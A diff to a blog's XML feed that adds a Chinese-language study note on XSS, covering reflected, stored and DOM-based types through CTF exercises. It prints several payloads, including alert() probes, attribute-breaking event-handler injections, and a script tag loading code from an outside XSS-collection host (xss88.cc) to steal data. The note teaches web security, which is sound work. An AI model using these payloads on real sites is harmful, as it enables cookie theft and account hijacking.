@@ -4,6 +4,43 @@
   
     
     <entry>
+      <title>WEB攻防-通用漏洞-XSS跨站之基本概念</title>
+      <link href="/post/d2cf6b55.html"/>
+      <url>/post/d2cf6b55.html</url>
+      
+        <content type="html"><![CDATA[<h1 id="XSS原理"><a href="#XSS原理" class="headerlink" title="XSS原理"></a>XSS原理</h1><p>指攻击者利用网站程序对用户的输入过滤不足，输入可以显示在页面上对其它用户造成影响的HTML代码，从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。通过用户端注入恶意的可执行脚本，若服务器对用户的输入不进行处理或者处理不严谨的时候，浏览器就会直接执行用户注入的脚本。</p><p>XSS产生于前端的漏洞，常产生于：</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">1.数据交互的地方</span><br><span class="line"><span class="code">get、post、headers</span></span><br><span class="line"><span class="code">反馈与浏览</span></span><br><span class="line"><span class="code">富文本编辑器</span></span><br><span class="line"><span class="code">各类标签插入和自定义</span></span><br><span class="line"><span class="code">2.数据输出的地方</span></span><br><span class="line"><span class="code">用户资料</span></span><br><span class="line"><span class="code">关键词、标签、说明</span></span><br><span class="line"><span class="code">文件上传</span></span><br></pre></td></tr></table></figure><h1 id="反射型XSS攻击"><a href="#反射型XSS攻击" class="headerlink" title="反射型XSS攻击"></a>反射型XSS攻击</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>反射型xss又称为非持久型xss，需要欺骗用户去点击链接才能触达xss代码。一般容易出现在搜索页面，反射型xss大多数用来盗取用户的Cookie信息，由于是非持久性的xss，其危害满足条件也很苛刻，所以现实生活中一般很少有厂家接收这个漏洞。下图很好的概括了反射型xss的攻击流程</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230912171834623-1375811154.png" alt="1645676066748-edae56e3-341d-43e8-aa5a-723282b9ba90.png"></p><h2 id="实例演示"><a href="#实例演示" class="headerlink" title="实例演示"></a>实例演示</h2><p>我们以一道CTF题目来演示什么是反射型xss以及什么是xss平台</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240804155412316.png" alt="image-20240804155412316"></p><p>我们一进来就看就有空格过滤，我们先随便试一试，看看能不能进行简单的弹窗，我们先输入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，观察有什么结果出现</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240804155638757.png" alt="image-20240804155638757"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240804155729399.png" alt="image-20240804155729399"></p><p>我们发现进行了弹窗，这也印证了此处存在xss漏洞，我们可以使用xss平台当作我们的恶意服务器进行信息的接收，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240804160222639.png" alt="image-20240804160222639"></p><p>我们将这里面的script语句插入原来的框内，点击<code>submit</code>，然后将得到的url粘贴进<code>send url</code>中，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240804160418648.png" alt="image-20240804160418648"></p><p>然后我们在我们的xss平台就可以接收到相关的信息，成功获得flag</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240804160454620.png" alt="image-20240804160454620"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240804160555228.png" alt="image-20240804160555228"></p><h1 id="存储型XSS攻击"><a href="#存储型XSS攻击" class="headerlink" title="存储型XSS攻击"></a>存储型XSS攻击</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>是持久型xss攻击，攻击代码会被存储进被害者数据库中，类似于留言板和评论的地方，攻击者将攻击代码xss植入留言板后，之后的人只要访问留言板就会受到攻击，其相关原理图如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/2504969-20230912171834314-1421941740.png" alt="1645676102364-3d7c9835-2926-4b89-bbe1-2a7dc2830058.png"></p><h2 id="实例演示-1"><a href="#实例演示-1" class="headerlink" title="实例演示"></a>实例演示</h2><p>我们以ctfhub上的题目作为演示，如下所示，同样将刚刚的代码复制到第一个框中</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240804161821710.png" alt="image-20240804161821710"></p><p>可以发现我们这里的url并不带有像反射型xss一样的后缀，说明这里是存储型xss，已经将恶意代码存储到服务器中去了，我们这里只需要访问该url即可，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240804162402587.png" alt="image-20240804162402587"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240804162947533.png" alt="image-20240804162947533"></p><p>同样可以获取flag</p><h1 id="DOM型XSS攻击"><a href="#DOM型XSS攻击" class="headerlink" title="DOM型XSS攻击"></a>DOM型XSS攻击</h1><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><p>DOM型XSS比较特殊，是基于文档对象模型的一种漏洞，DOM-XSS是通过url传入参数去控制触发的，它不经过后端，完全由前端代码组成，其产生代码如下所示</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">domxss</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="keyword">var</span> str = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;text&quot;</span>).<span class="property">value</span>;</span><br><span class="line">                <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;dom&quot;</span>).<span class="property">innerHTML</span> = <span class="string">&quot;&lt;a href=&#x27;&quot;</span>+str+<span class="string">&quot;&#x27;&gt;what do you see?&lt;/a&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">对传过来的数据进行接受赋值给str，str在进行接连地址，构造一个完整的地址。</span><br><span class="line">比如输入<span class="number">123</span>，然后点击，他的地址就会变成<span class="attr">http</span>:<span class="comment">//127.0.0.1:8081/web/mysql/123，这个值在&lt;a href=&quot;123&quot;&gt;what do you see?&lt;/a&gt;这里显示，那么就可以构造payload&#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt; &#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span></span><br></pre></td></tr></table></figure><h2 id="实例演示-2"><a href="#实例演示-2" class="headerlink" title="实例演示"></a>实例演示</h2><p>由于DOM类型全部发生在前端，所以我们可以先查看一下前端源码，看看能不能有什么特殊的启示，首先查看源码，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240804164225860.png" alt="image-20240804164225860"></p><p>我们的script语句肯定不能被单引号闭合，否则被当作字符串进行执行，就达不到我们想要的效果了，这里我们先传进行一个srcipt语句，看看不做任何处理会发生什么</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240804164536726.png" alt="image-20240804164536726"></p><p>被包含进去了，且页面没有任何变化，所以我们要闭合单引号、分号、<code>&lt;script&gt;</code>，所以输入<code>&#39;;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240804165144773.png" alt="image-20240804165144773"></p><p>所以接下来输入<code>&#39;;&lt;/script&gt;&lt;sCRiPt sRC=//xss88.cc/er6&gt;&lt;/sCrIpT&gt;//</code>，之后在xss平台上查看即可</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网络攻防 </category>
+          
+          <category> WEB攻防 </category>
+          
+          <category> XSS跨站请求 </category>
+          
+          <category> 笔记 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 反射型XSS </tag>
+            
+            <tag> 存储型XSS </tag>
+            
+            <tag> DOM型XSS </tag>
+            
+            <tag> 跨站劫持 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>WEB攻防-通用漏洞-文件上传之中间件解析、编辑器安全</title>
       <link href="/post/2819e325.html"/>
       <url>/post/2819e325.html</url>
